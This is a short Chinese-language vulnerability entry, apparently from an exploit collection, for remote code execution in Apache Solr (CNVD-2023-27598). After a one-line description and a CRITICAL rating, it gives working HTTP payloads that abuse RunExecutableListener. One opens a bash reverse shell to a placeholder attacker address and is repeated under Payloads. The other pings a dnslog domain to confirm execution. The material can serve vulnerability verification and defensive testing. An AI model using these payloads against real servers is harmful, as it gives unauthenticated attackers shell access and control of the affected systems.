# Apache Solr 代码执行漏洞 CNVD-2023-27598

## 漏洞描述
Solr 以 Solrcloud 模式启动且可出网时，未经身份验证的远程攻击者可以通过发送特制的数据包进行利用，最终在目标系统上远程执行任意代码。

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
使用postCommit来命令执行

```
POST /solr/demo/config HTTP/1.1
Host: 192.168.1.92:8983
Content-Length: 180
Content-Type: application/json

{"add-listener":{"event":"postCommit","name":"suiyi","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "bash -i >& /dev/tcp/your-ip/9999 0>&1"]}}
```

## Payloads
```
POST /solr/demo/config HTTP/1.1
Host: 192.168.1.92:8983
Content-Length: 180
Content-Type: application/json

{"add-listener":{"event":"postCommit","name":"suiyi","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "bash -i >& /dev/tcp/your-ip/9999 0>&1"]}}
```
```
POST /solr/demo/config HTTP/1.1
Host: 192.168.1.92:8983
Content-Length: 170
Content-Type: application/json

{"add-listener":{"event":"newSearcher","name":"newSearcher3","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping -c 3 your-dnslog.dnslog.cn"]}}
```
